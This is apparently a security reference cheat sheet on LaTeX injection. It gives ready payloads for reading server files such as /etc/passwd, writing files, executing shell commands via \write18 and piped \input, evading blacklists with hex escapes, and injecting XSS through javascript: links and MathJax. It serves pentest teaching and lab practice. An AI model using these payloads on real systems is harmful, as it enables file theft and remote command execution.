# latex injection

> latex injection is a type of injection attack where malicious content is injected into latex documents. latex is widely used for document preparation and typesetting, particularly in academia, for producing high-quality scientific and mathematical documents. due to its powerful scripting capabilities, latex can be exploited by attackers to execute arbitrary commands if proper safeguards are not in place. 


## summary

* [file manipulation](#file-manipulation)
    * [read file](#read-file)
    * [write file](#write-file)
* [command execution](#command-execution)
* [cross site scripting](#cross-site-scripting)
* [labs](#labs)
* [references](#references)


## file manipulation

### read file

attackers can read the content of sensitive files on the server.

read file and interpret the latex code in it:

```tex
\input{/etc/passwd}
\include{somefile} # load .tex file (somefile.tex)
```

read single lined file:

```tex
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```

read multiple lined file:

```tex
\lstinputlisting{/etc/passwd}
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
\closein\file
```

read text file, **without** interpreting the content, it will only paste raw file content:

```tex
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```

if injection point is past document header (`\usepackage` cannot be used), some control 
characters can be deactivated in order to use `\input` on file containing `$`, `#`, 
`_`, `&`, null bytes, ... (eg. perl scripts).

```tex
\catcode `\$=12
\catcode `\#=12
\catcode `\_=12
\catcode `\&=12
\input{path_to_script.pl}
```

to bypass a blacklist try to replace one character with it's unicode hex value. 
- ^^41 represents a capital a
- ^^7e represents a tilde (~) note that the ‘e’ must be lower case

```tex
\lstin^^70utlisting{/etc/passwd}
```

### write file

write single lined file:

```tex
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{hello-world}
\write\outfile{line 2}
\write\outfile{i like trains}
\closeout\outfile
```


## command execution

the output of the command will be redirected to stdout, therefore you need to use a temp file to get it.

```tex
\immediate\write18{id > output}
\input{output}
```

if you get any latex error, consider using base64 to get the result without bad characters (or use `\verbatiminput`):

```tex
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```tex
\input|ls|base64
\input{|"/bin/hostname"}
```


## cross site scripting

from [@edoverflow](https://twitter.com/intigriti/status/1101509684614320130) 

```tex
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```

in [mathjax](https://docs.mathjax.org/en/latest/input/tex/extensions/unicode.html)

```tex
\unicode{<img src=1 onerror="<arbitrary_js_code>">}
```


## labs

* [root me - latex - input](https://www.root-me.org/en/challenges/app-script/latex-input)
* [root me - latex - command execution](https://www.root-me.org/en/challenges/app-script/latex-command-execution)


## references

- [hacking with latex - sebastian neef - march 10, 2016](https://0day.work/hacking-with-latex/)
- [latex to rce, private bug bounty program - yasho - july 6, 2018](https://medium.com/bugbountywriteup/latex-to-rce-private-bug-bounty-program-6a0b5b33d26a)
- [pwning coworkers thanks to latex - scumjr - november 28, 2016](http://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)